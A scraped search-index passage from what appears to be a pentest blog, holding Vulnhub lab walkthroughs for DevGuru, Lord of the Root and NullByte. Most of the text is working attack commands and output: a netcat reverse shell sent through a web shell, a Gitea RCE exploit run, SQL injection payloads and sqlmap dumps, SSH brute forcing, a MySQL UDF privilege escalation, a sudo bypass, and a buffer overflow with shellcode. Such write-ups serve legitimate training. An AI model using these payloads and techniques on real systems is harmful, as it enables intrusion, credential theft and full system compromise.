/tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.236.4 4444&amp;gt;/tmp/f&quot;Original :: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.236.4 4444&amp;gt;/tmp/fURL ENcoded :: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.236.4%204444%3E%2Ftmp%2Ff Execute reverse shell ┌──(root💀kali)-[~/tools/GitTools/Extractor]└─# curl http://192.168.236.6/?cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+192.168.236.4+4444%3E%2Ftmp%2Ff Privilege EscalationFrank - Via Creds Found in Linux + Gitea (RCE) Ran linpeas, found interesting file View /var/backups/app.ini.bak gitea:UfFPTF8C8jjxVF2m Access mysql w/ gitea:UfFPTF8C8jjxVF2m www-data@devguru:/var/www/html$ mysql -u gitea -p Enter password: UfFPTF8C8jjxVF2m MariaDB [gitea]&amp;gt; SHOW databases; MariaDB [gitea]&amp;gt; USE gitea; MariaDB [gitea]&amp;gt; SHOW tables; MariaDB [gitea]&amp;gt; SELECT * FROM user; MariaDB [gitea]&amp;gt; SELECT name,passwd from user; frank:c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900 MariaDB [gitea]&amp;gt; SELECT name, login_name, passwd, passwd_hash_algo FROM user; +-------+------------+----------+------------------+ | name | login_name | passwd | passwd_hash_algo | +-------+------------+----------+------------------+ | frank | | c200.... | pbkdf2 | +-------+------------+----------+------------------+ Unable to identify hash Generate bcrypt hash Change password MariaDB [gitea]&amp;gt; UPDATE user -&amp;gt; SET login_name = &#39;frank&#39; -&amp;gt; WHERE name=&#39;frank&#39;; Query OK, 0 rows affected (0.01 sec) Rows matched: 1 Changed: 1 Warnings: 0 MariaDB [gitea]&amp;gt; UPDATE user -&amp;gt; SET passwd_hash_algo = &#39;bcrypt&#39; -&amp;gt; WHERE name=&#39;frank&#39;; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 MariaDB [gitea]&amp;gt; UPDATE user -&amp;gt; SET passwd = &#39;$2a$12$3mVpdsh50M28M0QAQts65uNhSlhJkp3qdx6C97Gd9wUp.2nQ.jI46&#39; -&amp;gt; WHERE name=&#39;frank&#39;; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 Login w/ frank:password Earlier, we found an exploit that requires authentication, run it ┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6/exploit/gitea/rce] └─# git config --global user.email &quot;asdf@example.com&quot; ┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6/exploit/gitea/rce] └─# git config --global user.name &quot;asdf&quot; ┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6/exploit/gitea] └─# python3 49571.py -t http://$ip:8585 -u frank -p password -I 192.168.236.4 -P 1337 _____ _ _______ / ____(_)__ __| CVE-2020-14144 | | __ _ | | ___ __ _ | | |_ | | | |/ _ \\/ _` | Authenticated Remote Code Execution | |__| | | | | __/ (_| | \\_____|_| |_|\\___|\\__,_| GiTea versions &amp;gt;= 1.1.0 to &amp;lt;= 1.12.5 [+] Starting exploit ... hint: Using &#39;master&#39; as the name for the initial branch. This default branch name hint: is subject to change. To configure the initial branch name to use in all hint: of your new repositories, which will suppress this warning, call: hint: hint: git config --global init.defaultBranch &amp;lt;name&amp;gt; hint: hint: Names commonly chosen instead of &#39;master&#39; are &#39;main&#39;, &#39;trunk&#39; and hint: &#39;development&#39;. The just-created branch can be renamed via this command: hint: hint: git branch -m &amp;lt;name&amp;gt; Initialized empty Git repository in /tmp/tmp.T8KmuZEi5T/.git/ [master (root-commit) d9313e2] Initial commit 1 file changed, 1 insertion(+) create mode 100644 README.md Enumerating objects: 3, done. Counting objects: 100% (3/3), done. Writing objects: 100% (3/3), 240 bytes | 240.00 KiB/s, done. [+] Exploit completed ! ┌──(root💀kali)-[~/tools/GitTools/Extractor] └─# nc -nvlp 1337 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::1337 Ncat: Listening on 0.0.0.0:1337 Ncat: Connection from 192.168.236.6. Ncat: Connection from 192.168.236.6:44070. bash: cannot set terminal process group (755): Inappropriate ioctl for device bash: no job control in this shell frank@devguru:~/gitea-repositories/frank/vuln.git$ whoami whoami frank Manual exploit https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/ Flag frank@devguru:/home/frank$ cat user.txtcat user.txt22854d0aec6ba776f9d35bf7b0e00217frank@devguru:/home/frank$ Root - Via Sudo Exploit + Sudo GTFO Bin Ran linpeas Find exploit https://www.exploit-db.com/exploits/47502 Saw this in TryHackMe: AgentSudo Check for sudo access frank@devguru:~/gitea-repositories/frank/vuln.git$ sudo -l sudo -l Matching Defaults entries for frank on devguru: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User frank may run the following commands on devguru: (ALL, !root) NOPASSWD: /usr/bin/sqlite3 Exploit frank@devguru:~/gitea-repositories/frank/vuln.git$ sudo -u#-1 /usr/bin/sqlite3 /dev/null &#39;.shell /bin/sh&#39; &amp;lt;o -u#-1 /usr/bin/sqlite3 /dev/null &#39;.shell /bin/sh&#39; sh: 0: getcwd() failed: No such file or directory sh: 0: getcwd() failed: No such file or directory whoami root Flag root@devguru:/# cd /root cd /root root@devguru:/root# ls ls msg.txt root.txt root@devguru:/root# cat * Congrats on rooting DevGuru! Contact me via Twitter @zayotic to give feedback! 96440606fb88aa7497cde5a8e68daf8f root@devguru:/root# " }, { "title": "Vulnhub - Lord of the Root 1.0.1", "url": "/posts/Lord-of-the-Root-1.0.1/", "categories": "Vulnhub, Linux", "tags": "port-knocking, exploit/sqli/database-enum, linux-priv-esc/mysql, linux-priv-esc/kernel-exploit, bof/linux-bof", "date": "2022-02-01 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ SSH revealing a port knocking sequence, allowing us to open an additional port TCP/1337 running HTTP. The webpage has a login page that is susceptible to SQLi, allowing us to enumerate the Webapp database revealing several credentials. With the credentials, we are able to bruteforce SSH and obtain a shell.There are 3 ways to obtain root, the easiest way is via a kernel exploit and can be done by downloading an exploit on exploit db.Another way is via mysql is running as root, allowing us to access mysql to create a UDF function to escalate our privilege, obtaining root.The final way (hardest) is a buffer overflow vulnerability existing in the SUID file.Recon Only TCP/22 (SSH) is up Requires Port Knocking to open up portsTCP/22 (SSH)Port Knocking Connect to SSH Could be port knocking? Port Knock ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit] └─# knock -v $ip 1 2 3; hitting tcp 192.168.236.10:1 hitting tcp 192.168.236.10:2 hitting tcp 192.168.236.10:3 Check for newly opened ports ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit] └─# nmap $ip -p- Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 01:08 +08 Nmap scan report for 192.168.236.10 Host is up (0.00044s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 1337/tcp open waste MAC Address: 08:00:27:FF:4B:98 (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 104.95 seconds TCP/1337 TCP/1337 (HTTP)NMAP Complete Scan┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]└─# nmap -sV -sC -A $ip -p 1337 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 01:23 +08Nmap scan report for 192.168.236.10Host is up (0.00047s latency).PORT STATE SERVICE VERSION1337/tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-title: Site doesn&#39;t have a title (text/html).|_http-server-header: Apache/2.4.7 (Ubuntu)MAC Address: 08:00:27:FF:4B:98 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4Network Distance: 1 hop TCP/1337 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]└─# ffuf -u http://$ip:1337/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; -fw 21 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.236.10:1337/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 21________________________________________________ [Status: 200, Size: 64, Words: 3, Lines: 4]404.html [Status: 200, Size: 116, Words: 3, Lines: 5]images [Status: 301, Size: 323, Words: 20, Lines: 10]index.html [Status: 200, Size: 64, Words: 3, Lines: 4]index.html [Status: 200, Size: 64, Words: 3, Lines: 4]:: Progress: [18460/18460] :: Job [1/1] :: 4242 req/sec :: Duration: [0:00:04] :: Errors: 0 :: 404.html images index.htmlInitial FootholdTCP/80 (HTTP) - SQLi (Blind) Database Enumeration View enumerated directories index.html 404.html Hidden Text images Download all images &amp;amp; Analyze for hidden text/file Could not find any Decode hidden text ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit] └─# echo -n THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -d Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer! ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit] └─# echo -n THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -d | base64 -d /978345210/index.phpbase64: invalid input /978345210/index.php Proceed to /978345210/index.php Tried to bruteforce it, did not work Try SQLi Payloads Try Time Based SQLi &#39;or sleep(5)# It worked Try SQLi Auth Bypass payload 1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055 Successfully login, could not do anything w/ the login apge Instead of Authentication Bypass, we have to enumerate the database Run SQLMap ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL] └─# sqlmap -r sqli.txt --dump --output-dir=$(pwd)/sqlmap -v 5 Parameter: username (POST) Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=test&#39; AND (SELECT 7506 FROM (SELECT(SLEEP(5)))vOBo) AND &#39;enuE&#39;=&#39;enuE&amp;amp;password=test&amp;amp;submit= Login Database: Webapp Table: Users [5 entries] +----+------------------+----------+ | id | password | username | +----+------------------+----------+ | 1 | iwilltakethering | frodo | | 2 | MyPreciousR00t | smeagol | | 3 | AndMySword | aragorn | | 4 | AndMyBow | legolas | | 5 | AndMyAxe | gimli | +----+------------------+----------+ Create wordlist ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL] └─# cat sqlmap/192.168.236.10/dump/Webapp/Users.csv | cut -d &#39;,&#39; -f2 | sed &#39;s/password//g&#39; | awk &#39;NF&#39; &amp;gt; passwords.txt ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL] └─# cat sqlmap/192.168.236.10/dump/Webapp/Users.csv | cut -d &#39;,&#39; -f3 | sed &#39;s/username//g&#39; | awk &#39;NF&#39; &amp;gt; usernames.txt ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL] └─# cat usernames.txt frodo smeagol aragorn legolas gimli ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL] └─# cat passwords.txt iwilltakethering MyPreciousR00t AndMySword AndMyBow TCP/22 (SSH) - Bruteforce Bruteforce SSH ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL]└─# hydra -L usernames.txt -P passwords.txt ssh://$ip -e nsrHydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-25 04:16:37[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 40 login tries (l:5/p:8), ~3 tries per task[DATA] attacking ssh://192.168.236.10:22/[22][ssh] host: 192.168.236.10 login: smeagol password: MyPreciousR00t1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-25 04:16:43 smeagol:MyPreciousR00t Access SSH w/ smeagol:MyPreciousR00t Privilege EscalationRoot - Via MySQL running as Root Linpeas Check ASLR smeagol@LordOfTheRoot:/SECRET/door1$ cat /proc/sys/kernel/randomize_va_space 2 ASLR is enabled, hard/unable to do BOF Check system processes running as root smeagol@LordOfTheRoot:/SECRET/door1$ ps aux | grep root ... root 1183 0.0 0.8 327004 8748 ? Ssl 16:31 0:11 /usr/sbin/mysqld ... mysqld running as root Find SQL Credentials smeagol@LordOfTheRoot:/var/www$ grep -Rnw $(pwd)/*/* -ie &quot;sql&quot; --color=always 2&amp;gt;/dev/null /var/www/978345210/login.php:19: $sql=&quot;select username, password from Users where username=&#39;&quot;.$username.&quot;&#39; AND password=&#39;&quot;.$password.&quot;&#39;;&quot;; /var/www/978345210/login.php:20: //echo $sql; /var/www/978345210/login.php:21: /var/www/978345210/login.php View login.php root:darkshadow Access mysql w/ root:darkshadow MySQL running as root exploit https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf Exploit Download raptor_udf2.c wget https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c Compile raptor_udf2.c smeagol@LordOfTheRoot:/tmp$ gcc -g -c raptor_udf2.c smeagol@LordOfTheRoot:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc Access mysql mysql -u root -p darkshadow Import raptor_udf.so mysql&amp;gt; create table foo(line blob); Query OK, 0 rows affected (0.00 sec) mysql&amp;gt; insert into foo values(load_file(&#39;/tmp/raptor_udf2.so&#39;)); Query OK, 1 row affected (0.00 sec) mysql&amp;gt; select * from foo into dumpfile &#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;; Query OK, 1 row affected (0.00 sec) mysql&amp;gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;; Query OK, 0 rows affected (0.00 sec) mysql&amp;gt; select * from mysql.func; +-----------+-----+----------------+----------+ | name | ret | dl | type | +-----------+-----+----------------+----------+ | do_system | 2 | raptor_udf2.so | function | +-----------+-----+----------------+----------+ 1 row in set (0.00 sec) Create rootbash select do_system(&#39;cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash&#39;); Check if rootbash exists smeagol@LordOfTheRoot:/tmp$ ls -la total 1004 drwxrwxrwt 4 root root 4096 Jan 25 08:57 . drwxr-xr-x 23 root root 4096 Sep 22 2015 .. drwxrwxrwt 2 root root 4096 Jan 25 07:52 .ICE-unix -rw-rw-r-- 1 smeagol smeagol 3314 Jan 25 00:27 raptor_udf2.c -rw-rw-r-- 1 smeagol smeagol 3192 Jan 25 08:46 raptor_udf2.o -rwxrwxr-x 1 smeagol smeagol 8418 Jan 25 08:46 raptor_udf2.so -rwsr-s--x 1 root root 986672 Jan 25 08:56 rootbash -r--r--r-- 1 root root 11 Jan 25 07:52 .X0-lock drwxrwxrwt 2 root root 4096 Jan 25 07:52 .X11-unix smeagol@LordOfTheRoot:/tmp$ Obtain root shell Flag rootbash-4.3# cat Flag.txt “There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”– Gandalfrootbash-4.3# Root - Via Kernel Exploit Linpeas 3.19.0-25-generic Ubuntu 14.04 Find exploits for 3.19.0-25-generic, Ubuntu 14.04 https://www.exploit-db.com/exploits/39166 Transfer to target &amp;amp; exploit smeagol@LordOfTheRoot:/tmp$ nc 192.168.236.4 4444 &amp;gt; 39166.c smeagol@LordOfTheRoot:/tmp$ gcc 39166.c -o exploit smeagol@LordOfTheRoot:/tmp$ ./exploit root@LordOfTheRoot:/tmp# Root - Via BufferOverflow Video Demo Determine Buffer Size till EIP overflows with A Via fuzzing Buffer Size: 200 Create msf-pattern msf-pattern_create -l 200Pattern:run $(python -c &#39;print &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&quot;&#39;) Use env env - gdb /SECRET/door3/file show env unset env LINES unset env COLUMNS show env Determine Pattern Address &amp;amp; Return Address # Determine Return Address # Address must not have badCharsi r # Look at ESPi r espx/40x $esp # Determine Pattern Address # Or you can just look at where program crashed &amp;lt;0xADDRESS in ?? ()&amp;gt;i r eip Pattern Address: 0x41376641 Return Address: 0xbfb82e80 Little Endian: \\x80\\x2e\\xb8\\xbf Determine EIP offset msf-pattern_offset -q 0x41376641 EIP offset: 171 Ensure EIP offset run $(python -c &#39;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;C&quot; * 200&#39;) Shellcode ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/bof] └─# cat shellcode | sed &#39;s/&quot;//g&#39; | tr -d &#39;\\n&#39; \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80 Exploit for x in {1..1000}; do env - /SECRET/door3/file $(python -c &#39;print &quot;A&quot;*171 + &quot;\\x80\\x2e\\xb8\\xbf&quot; + &quot;\\x90&quot; * 20000 + &quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80&quot;&#39;); done " }, { "title": "Vulnhub - NullByte 1", "url": "/posts/NullByte-1/", "categories": "Vulnhub, Linux", "tags": "image-forensics, exploit/sqli/database-enum, linux-priv-esc/suid/path-hijacking, linux-priv-esc/kernel-exploit", "date": "2022-01-31 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Thu Feb 3 18:22:24 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/NullByte/192.168.110.11/scans/_full_tcp_nmap.txt -oX /root/vulnHub/NullByte/192.168.110.11/scans/xml/_full_tcp_nmap.xml 192.168.110.11adjust_timeouts2: packet supposedly had rtt of -991247 microseconds. Ignoring time.Nmap scan report for 192.168.110.11Host is up, received arp-response (0.0013s latency).Scanned at 2022-02-03 18:22:37 +08 for 24sNot shown: 65531 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))| http-methods: |_ Supported Methods: POST OPTIONS GET HEAD|_http-title: Null Byte 00 - level 1|_http-server-header: Apache/2.4.10 (Debian)111/tcp open rpcbind syn-ack ttl 64 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 34000/tcp6 status| 100024 1 40022/tcp status| 100024 1 41283/udp status|_ 100024 1 57154/udp6 status777/tcp open ssh syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)| ssh-hostkey: | 1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)| ssh-dss AAAAB3NzaC1kc3MAAACBALLUIu4tXFadebYrnD994oq52RRYSpBO4UBHiXnGTGEgm6UlIDR8IT81T9RaJg5DjFIfjfzTfeIJVmDKMk2Zz/itniXKB7FRbF5Exyp4Vu2IzD76Iepu1qBmGrQdgtAwR+rCtu4KQ30KtCK48OvZO409Nbff8AB5ScuHePourSMVAAAAFQDbcAuY6E2l8runB/XMCs4kevsorQAAAIBlurtYJXxZFPdyfnVzCvGlp74pknTmM7BExEyU5tdJAGjPPF3+ApdNXk9b8cWKoKsGK++cEQgkZAuIgj9uso853WwS4NArT/P0j9cmqvKmMmClZWMFf/pXARoW9MsyZ9Eudo2TWBEgtqknVqStsSAp5UaxITyFCGoISaAJSpXtawAAAIEAnGErIK3lL2HxBvKbVJYpKdY9jjlsd+Ly8iPJW5m2BUXRDPVMU4kN5yhXfcK9Ls4W/SWApzj7zt5c5j3KixB8+pjpIMZqqnHbDcHbL1o+gPbwaSzeZVrHxnmCay3eWadclIykRadr3wdsnCa+6wSGEAW/1VbODQ4g84jRVj3iHCo=| 2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCk720eL8a5T2a7mSbBQm1Ga6mDBH354s4kS4YPzJdZDgpdsRpqyZtrYr09HxkOpdk2Qt5yVo8Wq0UCqGmcqSd5u8Zx36OjUp3gwKhyQD8HXfhr3Edp65wt3PY7jlEKyXrGiJPQWYCOJAxfRW+VzBM13EKRWjS+jlovyjz0/BJpdX/cehGTyg/YkOT98g2oiDZm8ydGmFHa1psATUf2/39NVA6ef6eL+WtrYRljiV7Bu4qrX+WU2DLCZy28SjA23m48I+Thy05pLZTgEYGeBAH6UbC+96DUyrSqbAF0I+OBPXNclrmSB956VdDOBe6RjSJsrO9bXUQbb5oT2XnjdTTB| 256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAkdg5B2LQmX+0vhiEavzVhKN0ZaU1e1Zi1ANcCmz5W63z65sBL6iRvzF+XNCW3dmsvsC1lRlLYDpj94RElY3ag=| 256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxwJ5299oAQPJtmnso4wAqIdz2ACkCMWsvxgf16XX/G40022/tcp open status syn-ack ttl 64 1 (RPC #100024)MAC Address: 08:00:27:3C:BF:5C (Oracle VirtualBox virtual NIC)OS fingerprint not ideal because: Didn&#39;t receive UDP response. Please try again with -sSUAggressive OS guesses: Linux 3.2 - 4.9 (96%), Sony Bravia smart TV (Android) (93%), Linux 3.10 - 4.11 (93%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (93%), Sony Android TV (Android 5.0) (92%), Android 5.1 (92%), Linux 3.2 - 3.16 (92%), Linux 3.12 (92%), Android 4.0 (92%), Linux 3.13 (91%)No exact OS matches for host (test conditions non-ideal).TCP/IP fingerprint:SCAN(V=7.92%E=4%D=2/3%OT=80%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61FBAD05%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=2%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=N)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=N)T1(R=Y%DF=Y%TG=40%S=O%A=O%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 0.004 days (since Thu Feb 3 18:16:37 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 1.31 ms 192.168.110.11Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Feb 3 18:23:01 2022 -- 1 IP address (1 host up) scanned in 38.04 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/NullByte]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.11/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403________________________________________________ [Status: 200, Size: 196, Words: 20, Lines: 11]index.html [Status: 200, Size: 196, Words: 20, Lines: 11]index.html [Status: 200, Size: 196, Words: 20, Lines: 11]javascript [Status: 301, Size: 321, Words: 20, Lines: 10]phpmyadmin [Status: 301, Size: 321, Words: 20, Lines: 10]uploads [Status: 301, Size: 318, Words: 20, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 1983 req/sec :: Duration: [0:00:03] :: Errors: 0 :: phpmyadmin uploadsInitial FootholdTCP/80 (HTTP) - Image Forensics + HTTP Form Bruteforce View enumerated directories index.html phpmyadmin uploads Enumerate uploads ┌──(root💀kali)-[~/vulnHub/NullByte] └─# ffuf -u http://192.168.110.11/uploads/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.php,.txt&#39; -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.11/uploads/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .php .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ index.html [Status: 200, Size: 113, Words: 6, Lines: 7] :: Progress: [18460/18460] :: Job [1/1] :: 215 req/sec :: Duration: [0:00:04] :: Errors: 0 :: Tried some default creds on phpmyadmin, failed Only clue we have is the image, download the image ┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/loot/http] └─# wget -q http://192.168.110.11/main.gif Detect any hidden text/files ┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/loot/http] └─# exiftool main.gif | grep -i comment Comment : P-): kzMb5nVYJw kzMb5nVYJw Proceed to /kzMb5nVYJw “password ain’t that complex” Bruteforce ┌──(root💀kali)-[~/vulnHub/NullByte] └─# ffuf -d &quot;key=FUZZ&quot; -u http://192.168.110.11/kzMb5nVYJw/index.php -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -w 